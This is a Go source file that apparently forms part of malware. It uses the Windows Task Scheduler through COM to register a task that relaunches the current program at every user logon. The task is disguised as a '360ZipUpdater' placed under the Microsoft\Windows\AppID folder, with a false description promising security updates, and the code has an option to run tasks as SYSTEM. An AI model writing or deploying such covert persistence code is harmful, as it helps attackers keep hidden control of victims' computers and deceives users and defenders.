package components

import (
	"fmt"
	"os"
	"os/user"
	"path/filepath"

	"github.com/go-ole/go-ole"

	"github.com/go-ole/go-ole/oleutil"
)

func getUID() string {
	currentUser, _ := user.Current()
	return currentUser.Username
}

func createTask(taskpath, xmldef string, mode int) error {
	ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED)
	defer ole.CoUninitialize()
	taskService, _ := oleutil.CreateObject("Schedule.Service")
	defer taskService.Release()
	taskServiceDisp, _ := taskService.QueryInterface(ole.IID_IDispatch)
	defer taskServiceDisp.Release()
	oleutil.CallMethod(taskServiceDisp, "Connect")
	rootFolderDisp, _ := oleutil.CallMethod(taskServiceDisp, "GetFolder", "\\")
	rootFolder := rootFolderDisp.ToIDispatch()
	defer rootFolder.Release()
	thisuser := getUID()
	taskDefDisp, _ := oleutil.CallMethod(taskServiceDisp, "NewTask", 0)
	taskDef := taskDefDisp.ToIDispatch()
	defer taskDef.Release()

	// Set the task type and task user
	var taskType int
	var user string
	if mode == 0 {
		user = thisuser
		taskType = 3
	} else if mode == 1 {
		user = "nt authority\\SYSTEM"
		taskType = 5
	} else if mode == 2 {
		taskType = 0
	} else {
		return nil
	}

	// Register the task
	oleutil.CallMethod(rootFolder, "RegisterTask", taskpath, xmldef, 0x00000006, user, nil, taskType, "O:BAG:BAD:(A;;FA;;;SY)(A;;FA;;;BA)")
	return nil
}

func Login() {
	// 自动获取当前程序路径
	executablePath, _ := os.Executable()
	executablePath, _ = filepath.Abs(executablePath)
	// 自动获取当前用户
	userId := getUID()
	// 定义任务描述
	description := "此任务可使您自动获取最新的功能和安全修补。"
	// 更新XML定义，使用自动获取的路径
	// 这里不指定 <UserId>，这样任务将在任何用户登录时触发
	xmldef := fmt.Sprintf(`
		<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
		<RegistrationInfo>
		<Description>%s</Description>
		</RegistrationInfo>
		<Triggers>
		<LogonTrigger>
		<Enabled>true</Enabled>
		</LogonTrigger>
		</Triggers>
		<Principals>
		<Principal>
		<UserId>%s</UserId>
		</Principal>
		</Principals>
		<Settings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		</Settings>
		<Actions>
		<Exec>
		<Command>%s</Command>
		</Exec>
		</Actions>
		</Task>
`, description, userId, executablePath)

	taskpath := "\\Microsoft\\Windows\\AppID\\360ZipUpdater"
	mode := 2
	createTask(taskpath, xmldef, mode)
}
